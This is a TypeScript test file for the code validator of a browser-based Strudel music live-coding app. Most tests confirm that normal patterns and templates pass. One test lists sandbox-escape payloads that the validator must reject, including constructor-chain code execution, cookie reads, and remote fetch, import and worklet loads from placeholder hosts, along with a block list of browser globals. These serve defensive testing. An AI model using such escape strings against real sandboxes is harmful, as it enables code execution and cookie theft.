import test from 'node:test';
import assert from 'node:assert/strict';
import { verifyCode, syntaxOk, strudelGlobalCheck } from '../src/lib/safeCode.ts';
import { compileGraph, applyGlobalMaster, applyTimeline, sanitizeMasterFx } from '../src/graph/compile.ts';
import { automationSuffix, masterAutomationSuffix } from '../src/lib/automation.ts';
import { withMetronome } from '../src/lib/metronome.ts';
import { TEMPLATES } from '../src/lib/templates.ts';

// @strudel/core no carga en Node (depende de kabelsalat), así que el alcance de Strudel se
// simula: cualquier nombre está, salvo los del navegador. En la app sale de `strudelScope`
// (y la prueba en el navegador confirma que las plantillas pasan con el alcance real).
const BROWSER = new Set(['window', 'self', 'document', 'fetch', 'setTimeout', 'setInterval', 'eval', 'Function', 'globalThis',
  'XMLHttpRequest', 'alert', 'Reflect', 'Proxy', 'location', 'navigator', 'localStorage', 'indexedDB', 'importScripts',
  'postMessage', 'open', 'k']);
const scope = new Proxy({}, { getOwnPropertyDescriptor: (_t, k) => (typeof k === 'string' && !BROWSER.has(k) ? { value: 1, configurable: true, enumerable: true, writable: true } : undefined) }) as Record<string, unknown>;
const isGlobal = strudelGlobalCheck(scope);
const ok = (c: string) => verifyCode(c, isGlobal);

test('syntaxOk: una sola expresión, sin ejecutar', () => {
  assert.equal(syntaxOk('s("bd*4")'), true);
  assert.equal(syntaxOk('s("bd*4"'), false);
  assert.equal(syntaxOk('x) ; fetch(1) ; (y'), false); // escaparse del paréntesis no cuela
  assert.equal(syntaxOk(''), false);
});

test('acepta Strudel de todos los días', () => {
  for (const c of [
    's("bd*4").gain(0.8)',
    'note("c2 eb2 g2").s("sawtooth").lpf(sine.range(200,2000).slow(8)).room(0.3)',
    'stack(s("hh*8").gain(perlin.range(0.6,1)), n("0 2 4").scale("C:minor").s("piano"))',
    's("bd sd").every(4, x=>x.rev())',
    'arrange([4, s("bd*4")], [4, silence])',
    's("bd").lastOf(4, () => s("bd*8"))',
    'n("0 .. 7").scale("D:minor").s("supersaw").detune(0.2)',
  ]) assert.deepEqual(ok(c), { ok: true }, c);
});

test('acepta las curvas y la automatización que escribe Telar', () => {
  const auto = { vol: [[0, 1], [8, 0.2], [16, 1]], filt: [[0, 0], [4, -0.8]], pan: [[0, -0.5], [8, 0.5]] };
  const c1 = 's("bd*4")' + automationSuffix(auto, 32);
  assert.deepEqual(ok(c1), { ok: true }, c1);
  const c2 = 's("bd*4")' + masterAutomationSuffix({ mroom: [[0, 0], [8, 0.6]], mdelay: [[0, 0.3]], mcrush: [[0, 0], [4, 1]] }, 32);
  assert.deepEqual(ok(c2), { ok: true }, c2);
});

test('acepta todo lo que compilan las plantillas, con máster, tiempo y metrónomo', () => {
  const master = sanitizeMasterFx({ gain: 1, filter: 0, room: 0.2, drive: 0.3, delay: 0.2, crush: 0.1 } as never).master;
  for (const t of TEMPLATES) {
    const snap = t.build();
    // eslint-disable-next-line @typescript-eslint/no-explicit-any
    const r = compileGraph((snap.nodes ?? []) as any, (snap.edges ?? []) as any, {});
    assert.ok(r.code, `${t.title}: sin código (${r.error})`);
    const full = withMetronome(applyGlobalMaster(applyTimeline(r.code!, { from: 2, region: { start: 0, bars: 8 }, regionOn: true, countIn: 1 }), master), { on: true, beats: 4, countIn: 1 });
    assert.deepEqual(ok(full), { ok: true }, `${t.title}: ${ok(full).why}`);
  }
});

test('rechaza lo que abre la puerta al navegador', () => {
  for (const c of [
    's("bd").gain([]["fil"+"ter"]["con"+"structor"]("alert(1)")())', // la prueba de concepto de la auditoría
    'fetch("https://x.example")',
    's("bd").gain(window.name)',
    's("bd").gain(self.__x = 1)',
    's("bd").gain(this)',
    'new Function("alert(1)")',
    '(()=>0).constructor("alert(1)")()',
    's.constructor',
    'String.raw`x`',
    'Object.getOwnPropertyDescriptor(s, "x")',
    '((P,k)=>P[k][k]("alert(1)")())([1], "constructor")',
    '((i)=>{let j=1; j="constructor"; return [][j]})(0)',
    'getAudioContext().audioWorklet.addModule("https://x.example/a.js")',
    'evaluate("1")',
    's("bd").onTrigger((h, ctx) => ctx.canvas.ownerDocument.cookie)',
    '({__proto__: null})',
    'import("https://x.example/m.js")',
    'setTimeout("alert(1)")',
    's = 1',
    'async () => 1',
    '(function(){ return 1 })()',
    'strudelScope.evaluate("fetch(1)")', // el alcance trae evaluate como propiedad
    's("bd").gain(x.evaluate("1"))',
    'registerWorklet("https://x.example/w.js")',
    'setStringParser((s) => s)',
    'samples("https://x.example/tracker.json")',
    'getAudioDevices()',
    'resetLoadedSounds()',
  ]) assert.equal(ok(c).ok, false, c);
});

test('acepta las barras slider() y setcps', () => {
  assert.deepEqual(ok('s("bd*4").lpf(slider(800, 200, 4000))'), { ok: true });
  assert.deepEqual(ok('(setcps(0.6), s("bd*4"))'), { ok: true });
});
